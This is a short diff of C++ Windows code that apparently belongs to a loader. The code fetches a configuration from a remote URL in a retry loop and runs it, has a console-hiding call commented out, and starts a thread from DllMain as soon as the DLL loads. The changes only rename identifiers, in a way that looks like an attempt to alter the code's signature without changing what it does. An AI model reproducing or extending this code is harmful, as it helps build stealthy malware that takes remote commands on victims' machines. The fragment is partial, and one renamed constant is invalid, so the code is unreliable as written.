@@ -11,14 +11,14 @@
 
 int main(int argc, char* argv[])
 {
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW__HIDE);
 	string in(URL);
 	while (true)
 	{
 		try
 		{
-			CurlWapper _c;
-			string res = _c._get(URL);
+			Chttp __c;
+			string res = __c.__get(URL);
 			Conf* conf = new Conf(res);
 			conf->run();
 			return 0;
@@ -33,15 +33,15 @@ int main(int argc, char* argv[])
 
 
 BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul_reason_for_call,
+	DWORD  ul__reason__for__call,
 	LPVOID lpReserved
 )
 {
-	switch (ul_reason_for_call)
+	switch (ul__reason__for__call)
 	{
 	case DLL_PROCESS_ATTACH:
 	{
-		CreateThread(NULL, NULL, d_run, NULL, NULL, NULL);
+		CreateThread(NULL, NULL, d__run__, NULL, NULL, NULL);
 	}
 	break;
 	case DLL_THREAD_ATTACH:
